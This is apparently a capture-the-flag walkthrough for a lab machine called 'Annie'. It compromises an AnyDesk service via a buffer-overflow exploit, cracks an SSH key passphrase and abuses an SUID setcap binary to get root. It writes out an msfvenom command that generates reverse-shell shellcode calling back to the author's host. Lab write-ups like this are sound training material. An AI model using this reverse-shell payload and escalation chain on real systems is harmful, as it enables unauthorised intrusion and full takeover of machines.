Annie

Target IP: 10.10.108.90

Remote access comes in different flavors.

Scanning


There are two TCP ports open on the target machine as shown above. The application on port 7070 is interesting as it has the name "AnyDesk Client".

Enumeration & Exploitation

Port 7070: AnyDesk


The SSH application running on the target machine is vulnerable to a username attack. But doing a Google search for the application on this port showed me the RCE vulnerability above. Since this is a buffer-overflow attack, I will need to replace the shellcode with mine.


The command I used is msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.14.55.153 LPORT=80 -b "\x00\x25\x26" -f python -v shellcode to generate a shellcode for this exploit. Then I replaced the original shellcode with this new shellcode pointing to my machine and port. I used port 80 for the LPORT.


In the picture above, the top terminal is where I obtain the reverse shell connection from the target machine. The bottom terminal is where I deploy the exploit. Now I have a foothold on the target machine with the session as annie.

Privilege Escalation


I found the SSH key of the user annie inside her SSH directory. I copied this SSH key to my machine and used ssh2john to obtain the passphrase annie123.


Now I have a more stable access to the target machine using SSH. After changing permission of the SSH key to 400, I successfully gained access using the same key.


There is an interesting binary with SUID bit set.


Running strings on this binary shows the string message above. Maybe I can use this to give Python3 capabilities to escalate my privileges to root?


I created a copy of the Python3 binary at /tmp directory. Then using this SUID setcap binary, I gave the Python3 binary at /tmp directory higher privileges.


Then checking for any binaries with capabilities set using the command /sbin/getcap / -r 2>/dev/null shows /tmp/python3 has it!


Then spawning a root shell is super simple. GG. Now I have a root shell on the target machine!
